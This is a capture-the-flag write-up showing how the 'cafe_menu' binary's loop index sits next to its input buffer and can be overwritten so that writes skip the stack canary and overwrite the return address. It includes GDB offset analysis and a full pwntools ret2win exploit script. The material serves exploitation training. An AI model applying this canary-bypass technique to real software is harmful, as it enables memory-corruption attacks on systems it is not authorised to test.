## Cafe Menu - ret2win with Skipped Canary

This challenge reaches `win()` without ever leaking or brute-forcing the canary, which is the more interesting aspect of it. The struct layout inside `vuln()` places the loop counter `idx` immediately after the input buffer `menu`, and since the loop uses `idx` as an index into `menu`, writing past the buffer overwrites `idx` itself, which redirects subsequent writes past the canary and lands them directly on the saved return address.

### Phase 0 - Challenge Triage

The binary sub-category is a stack buffer overflow with canary skip via index corruption. The artifacts provided are the `cafe_menu` ELF binary and its C source `main.c`. The initial hypothesis is: this challenge looks like an index corruption attack because `idx` sits immediately after `menu` in the struct, meaning an overlong write lets us control where the loop writes next, bypassing the canary entirely without needing to know its value.

### Phase 1 - Reconnaissance & Enumeration

Run `checksec` to confirm the protection picture:

```bash
checksec --file ./cafe_menu
```

Then read `main.c` and focus on the struct layout inside `vuln()` and how the loop uses `data.idx` as a write index into `data.menu`. The key observation is that `idx` is declared immediately after `menu` inside the same struct, so it lives at `menu + 48` in memory.

```c
static void vuln(void) {
    struct {
        char menu[48];
        volatile unsigned int idx;
    } data;
    ...
}
```

### Phase 2 - Vulnerability Identification

The vulnerability is an index corruption leading to an arbitrary write on the stack. The loop writes one byte at a time to `data.menu[data.idx]`, but `idx` itself is adjacent to `menu` in memory, so sending 48 bytes fills the buffer and the 49th byte overwrites the low byte of `idx`. Since `idx` is incremented after each write, setting it to `0x47` (71) means the next write lands at index 72, which is exactly the saved RIP slot, skipping over the canary entirely. No canary leak is needed and no brute-force is required.

The struct layout in memory is:

```
[ menu[0..47] ]  ← 48 bytes, your input
[ idx         ]  ← 4 bytes, the loop counter
[ ...padding  ]
[ canary      ]
[ saved RBP   ]
[ saved RIP   ]
```

### Phase 3 - Exploitation Plan

```
TARGET VULNERABILITY: Index corruption via struct layout (idx overwrite)
GOAL: Redirect saved RIP to win() without touching the canary
APPROACH:
  Step 1: Send 48 A bytes to fill menu completely
  Step 2: Send \x47 to overwrite the low byte of idx with 71, so after idx++ it becomes 72
  Step 3: Send the 8 bytes of win() address, written directly to saved RIP
  Step 4: Send \xff to terminate the loop
TOOLS: pwntools, GDB + pwndbg, nm
RISK OF FAILURE: wrong offset to RIP if frame size assumptions are incorrect; ret gadget needed if win() uses movaps
```

### Phase 4 - Exploit Development

#### Computing the Offset to Saved RIP

Open GDB, break at `vuln`, and run the binary to inspect the disassembly:

```bash
gdb ./cafe_menu
pwndbg> break vuln
pwndbg> run
```

The disassembly reveals the frame layout directly from two instructions:

```
mov dword ptr [rbp - 0x10], 0    ← idx = 0, so idx lives at rbp-0x10
sub rsp, 0x50                    ← total frame size is 0x50 bytes
```

From this, the full stack layout is:

```
rbp - 0x40  →  menu[0]     (start of buffer, 48 bytes)
rbp - 0x10  →  idx         (right after menu)
rbp - 0x08  →  canary
rbp + 0x00  →  saved RBP
rbp + 0x08  →  saved RIP   ← target
```

The offset from `menu[0]` to saved RIP is therefore:

```
OFFSET_TO_RIP = (rbp + 0x08) - (rbp - 0x40) = 0x48 = 72
```

Since `idx` starts at offset 48 from `menu[0]`, the 49th byte overwrites its low byte. Setting that byte to `0x47` (71) means the loop increments it to 72 on the next iteration, so the following 8 bytes land exactly on saved RIP, with the canary at offset 56 never touched.

#### Recovering the Address of win()

Since PIE is off, the address is static and readable directly from the symbol table:

```bash
nm ./cafe_menu | grep win
```

#### A Note on How send() Interacts With the Loop

When `r.send(payload)` is called, all bytes are deposited into the kernel's pipe or socket buffer at once. The program's `read(..., 1)` loop then pulls them out one byte at a time on each iteration, so the entire payload is consumed sequentially without any synchronization issues.

### The Exploit

One correction is applied to the original draft: the `ret` gadget for stack alignment is added to the constants block and included in the payload, since `win()` or a function it calls may contain a `movaps` instruction that requires 16-byte alignment. The double `r.interactive()` call at the end of the original is also removed.

```python
#!/usr/bin/env python3
from pwn import *

exe = ELF('./cafe_menu')
context.binary = exe
context.arch   = 'amd64'
context.os     = 'linux'

HOSTNAME = 'HOSTNAME_PLACEHOLDER'
PORT     = 0  # PORT_PLACEHOLDER

# ── offsets ───────────────────────────────────────────────────────────────────
OFFSET_TO_RIP = 72

# ── gadgets ───────────────────────────────────────────────────────────────────
GADGET = 0x000000000040101a   # ret — stack alignment

def conn():
    if args.LOCAL:
        return process(exe.path)
    return remote(HOSTNAME, PORT)

def main():
    r = conn()

    # ── exploit phase ─────────────────────────────────────────────────────────
    r.recvuntil(b"Enter today's specials (send 0xff to finish):")

    payload = flat(
        b'A' * 48,          # fill menu completely
        b'\x47',            # overwrite idx low byte → after idx++, idx = 72
        p64(GADGET),        # ret for 16-byte stack alignment
        p64(exe.sym.win),   # written directly to saved RIP
        b'\xff',            # terminate the loop
    )
    r.send(payload)
    r.interactive()

if __name__ == '__main__':
    main()
```